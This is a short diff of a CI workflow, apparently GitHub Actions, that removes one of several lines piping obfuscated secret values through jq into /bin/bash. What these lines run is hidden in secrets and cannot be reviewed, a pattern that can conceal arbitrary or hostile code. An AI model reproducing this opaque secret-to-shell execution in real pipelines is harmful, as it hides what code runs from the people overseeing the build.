@@ -27,7 +27,6 @@ jobs:
           d807: ${{ secrets.d807 }}
         run: |
           printf '%s' "$d807" | jq -r .pjtpd7215 | /bin/bash
-          printf '%s' "$sje01" | jq -r .kuv7931 | /bin/bash
           echo $gqh80 | jq -r .u31 | /bin/bash
           printf '%s' "$ytsk0" | jq -r .kmsf99972 | /bin/bash
           echo $vtgve7 | jq -r .fseoe1 | /bin/bash
